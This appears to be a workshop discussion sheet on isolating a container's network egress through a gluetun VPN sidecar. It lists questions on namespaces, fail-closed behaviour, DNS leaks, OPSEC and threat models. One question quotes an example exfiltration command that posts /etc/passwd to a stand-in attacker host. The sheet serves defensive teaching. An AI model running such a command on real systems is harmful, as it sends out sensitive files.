# Discussion: network-egress

Questions for your LLM after the workshop.

## Understanding what just happened

- "Walk me through what `network_mode: \"service:gluetun\"` actually does at the Linux network namespace level. Why does the worker have *no* network when gluetun is in a failure state?"
- "Read the egress-probe output from inside the sidecar with no VPN credentials. What's the difference between `fail` rows and rows that just show `n/a`? Are any of them silent leaks I should worry about?"
- "Compare the baseline run (default container) against the via-sidecar run (failed gluetun). Which differences come from the *firewall rules* gluetun installed, versus from the *missing tunnel*?"

## Composition

- "Sketch a docker-compose.yml that combines the gluetun sidecar with container-isolation's hardening flags. Where do `--cap-drop`, `--read-only`, `--user` go in compose syntax? What can't be set this way?"
- "I want to run an agent that summarizes a repo from inside the worker. What goes through scoped Tier 0 (cred-scrub + direnv-perimeter), what gets passed via `-e VAR`, and what does the agent never see?"
- "If I compose this with cred-scrub on the host, what credentials end up reachable from inside the worker? List them, and tell me which I'd want to scrub even harder."

## Threat-model thinking

- "Suppose an exfil payload inside the worker calls `curl evil.com -d @/etc/passwd`. With gluetun running and authenticated, what does this actually achieve from the attacker's perspective? Is the VPN a defense, or just an obfuscator?"
- "What's a scenario where the fail-closed behavior *helps* against S1 specifically? What's a scenario where it doesn't?"
- "If my threat model is 'don't let an agent call out to a third-party API without me knowing,' is this the right tool, or is it the wrong layer?"

## OPSEC

- "Walk me through what a destination server can learn about a request from a Mullvad exit IP versus a residential IP. Where does that affect my threat model?"
- "If I'm using this for bug-bounty work where I don't want my home IP linked to my research, what's the actual chain of inference an attacker would have to break to identify me? Where's the weakest link?"

## Failure modes

- "What if the VPN provider gets a court order or is compromised — what does that change for the threats this layer was supposed to address?"
- "Walk me through DNS leak scenarios. How would I test for them, and what's the most likely cause if I find one?"
- "Suppose the gluetun container crashes mid-task. The worker is still running because `network_mode: \"service:gluetun\"` is namespace-sharing, not lifecycle-coupled. What's the worker doing now, and what's the risk?"
- "If I bind-mount `/var/run/docker.sock` into the worker (which I shouldn't), can it bypass the egress isolation? Trace the steps."

## Going beyond Mullvad

- "I want to use a Tor-based egress instead of a commercial VPN. What's the equivalent docker-compose pattern? What threat-model differences come with Tor?"
- "Compare gluetun against a self-hosted WireGuard endpoint. Pros, cons, when each is the right call."
- "What about an outbound proxy (squid, mitmproxy) instead of a VPN — different threat model, same shared-namespace trick. Sketch it."
